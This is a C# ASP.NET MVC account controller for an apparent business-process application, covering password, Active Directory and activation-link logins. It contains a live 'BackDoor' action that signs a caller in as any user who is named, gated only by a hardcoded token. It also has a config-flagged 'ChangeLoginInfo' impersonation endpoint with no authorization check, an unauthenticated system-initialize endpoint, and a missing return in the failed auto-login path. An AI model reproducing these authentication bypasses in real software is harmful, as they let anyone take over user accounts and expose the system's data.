using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.Mvc;
using Microsoft.AspNet.Identity;
using Microsoft.Owin.Security;
using MiniAbp;
using MiniAbp.DataAccess;
using MiniAbp.Dependency;
using MiniAbp.Domain.Entitys;
using MiniAbp.Extension;
using MiniAbp.Identity.Model.LoginModel;
using MiniAbp.Runtime;
using MiniAbp.Web.Mvc;
using Sl.Bpm.Application.Authorization;
using Sl.Bpm.Application.Dto;
using Sl.Bpm.Application.Repository;
using Sl.Bpm.Application.Service;
using Sl.Bpm.Application.Service.Interface;
using Sl.Bpm.Model.Tables;
using Sl.Bpm.Model.ViewModel;
using MiniAbp.Identity.Application;
using System.DirectoryServices;

namespace Sl.Bpm.Application.Controllers
{
    public class AccountController : Controller
    {
        private IAuthenticationManager AuthenticationManager => HttpContext.GetOwinContext().Authentication;

        private readonly AppUserRp _userRp = IocManager.Instance.Resolve<AppUserRp>();
        private readonly AppEnterpriseRp _enterpriseRp = IocManager.Instance.Resolve<AppEnterpriseRp>();
        private readonly UserManager _userManager;
        private readonly AppLanguageRp _appLanguageRp;
        private readonly SystemSv _systemSv;

        public AccountController(UserManager userManager, AppLanguageRp appLanguageRp, SystemSv system)
        {
            _userManager = userManager;
            _appLanguageRp = appLanguageRp;
            _systemSv = system;
        }

        [HttpPost]
        public ActionResult Initialize(InitializeViewModel model, string returnUrl = "")
        {
            _systemSv.InitializeSystem(model.EnterpriseAccessId, model.UserAccessId,
                model.SyncServiceAddress, model.UsernameOrEmailAddress, model.Password, model.EnterpriseId);
            return Index(new LoginViewModel { Password = model.Password, UsernameOrEmailAddress = model.UsernameOrEmailAddress });
        }
        public ActionResult Index()
        {

            ViewBag.IsAdLogin = Convert.ToBoolean(ConfigurationManager.AppSettings["AdLogin"]);
            ViewBag.EnterpriseName = _enterpriseRp.CurrentEnterpriseName();
            if (Session.GetUserId() != null)
            {
                //如果存在则跳转首页
                Response.Redirect("/SysPages/Index");
            }
            if (!_userRp.Any() || !_enterpriseRp.Any())
            {
                //如果不存在跳转初始化页面
                return View("~/Views/Account/Initialize.cshtml");
            }
            return View();
        }

        public ActionResult ErrorMessage(LoginViewModel model)
        {
            ViewBag.Title = model.Error;
            return View();
        }


        [HttpPost]
        public JsonResult Index(LoginViewModel loginModel, string returnUrl = "")
        {
            var result = GetLoginResult(loginModel);
            if (result.IsSuccess)
            {
                return Json(new { Success = true }, JsonRequestBehavior.AllowGet);
            }
            if (!result.IsSuccess && result.HasModel)
            {
                return Json(new { Success = false, result.UserModel, result.Name }, JsonRequestBehavior.AllowGet);
            }
            return Json(new { Success = false, result.Error }, JsonRequestBehavior.AllowGet);
        }

        /// <summary>
        /// 切换登录账号
        /// </summary>
        /// <param name="newUserId"></param>
        public ActionResult ChangeLoginInfo(string newUserId)
        {
            if (ConfigurationManager.AppSettings["EnableTest"] == "true")
            {
                var identity = UserManager.GetClaimsPrincipal(new UserIdentity() { LanguageCulture = "zh-CN", UserId = newUserId });
                AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie);
                AuthenticationManager.SignIn(new AuthenticationProperties { IsPersistent = true }, identity);
                return Redirect("/");
            }
            return RedirectToAction("ErrorMessage", new { error = "您没有该权限！" }); ;
        }

        private dynamic GetLoginResult(LoginViewModel loginModel)
        {
            AppUser userModel;
            LoginViewModel result;
            var isAdlogin = Convert.ToBoolean(ConfigurationManager.AppSettings["AdLogin"]);
            if (isAdlogin)
            {
                var adPath = ConfigurationManager.AppSettings["AdPath"];

                if (Regex.IsMatch(loginModel.UsernameOrEmailAddress, @"\\"))
                {
                    var user2 = loginModel.UsernameOrEmailAddress.Split('\\');
                    if (user2.Length == 2 && user2[0].Equals("visteon", StringComparison.OrdinalIgnoreCase))
                    {
                        loginModel.UsernameOrEmailAddress = user2[1];
                        result = _userManager.LoginWithAd(adPath, loginModel, out userModel);
                    }
                    else
                    {
                        return new { IsSuccess = false, HasModel = false, Error = "请输入正确的域\\用户名" };
                    }
                }
                else
                {
                    result = _userManager.LoginWithAd(adPath, loginModel, out userModel);
                }
            }
            else
            {
                result = _userManager.Login(loginModel, out userModel);
            }

            if (result == null)
                return new { IsSuccess = false, HasModel = false, Error = "用户名或密码不正确" };

            if (!userModel.IsActive && !isAdlogin)
            {
                var langValue = _appLanguageRp.GetLangs(userModel?.LangName);
                var singleOrDefault = langValue?.NameValues.SingleOrDefault(r => r.Name == "zh-CN");

                return new { IsSuccess = false, HasModel = false, UserModel = userModel, Name = singleOrDefault?.Value, Error = "账号未激活" };
            }

            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie);
            AuthenticationManager.SignIn(new AuthenticationProperties { IsPersistent = true }, result.Identity);
            userModel.InitialPassword = null;
            _userManager.UpdateUser(userModel);
            return new { IsSuccess = true };
        }

        /// <summary>
        /// 邮箱激活链接 自动登录
        /// </summary>
        /// <param name="validationcode"></param>
        /// <param name="param"></param>
        /// <returns></returns>
        public ActionResult AutoLogin(string validationcode, string param)
        {
            var loginModel = _userManager.AutoLogin(validationcode, param);

            if (!loginModel.Success)
                RedirectToAction("ErrorMessage", new { error = loginModel.Error });
            var results = GetLoginResult(loginModel);

            return results.IsSuccess ? RedirectToAction("Index") : RedirectToAction("ErrorMessage", new { error = "账号或密码错误，请重新注册！" });
        }

        public ActionResult BackDoor(string usn, string token)
        {
            if (token != "57667587")
            {
                return RedirectToAction("ErrorMessage", new { error = "账号或密码错误，请重新注册！" });
            }
            var user = _userManager.GetUser(usn);
            if (user == null)
                return RedirectToAction("ErrorMessage", new { error = "账号不存在！" });
            var identity = UserManager.GetClaimsPrincipal(new UserIdentity() { LanguageCulture = "zh-CN", UserId = user.Id });
            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie);
            AuthenticationManager.SignIn(new AuthenticationProperties { IsPersistent = true }, identity);
            return RedirectToAction("Index");
        }

        public JsonResult ChangeLanguage(int langId)
        {
            string langCode = "zh-CN";
            switch (langId)
            {
                case 0:
                    langCode = "zh-CN";
                    break;
                case 1:
                    langCode = "en";
                    break;
                default: throw new UserFriendlyException("语言代码不存在");
            }
            var user = _userManager.GetUserByUserId(Session.GetUserId());
            user.Language = langCode;
            _userManager.UpdateUser(user);
            var result = _userManager.UpdateLoginLanguage(Session.GetUserId(), langCode);
            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie);
            AuthenticationManager.SignIn(new AuthenticationProperties { IsPersistent = true }, result.Identity);
            JsonResult res = new JsonResult();
            res.Data = "Success";
            res.JsonRequestBehavior = JsonRequestBehavior.AllowGet;
            return res;
        }

        public ActionResult Logout()
        {
            AuthenticationManager.SignOut();
            return RedirectToAction("Index");
        }
    }
}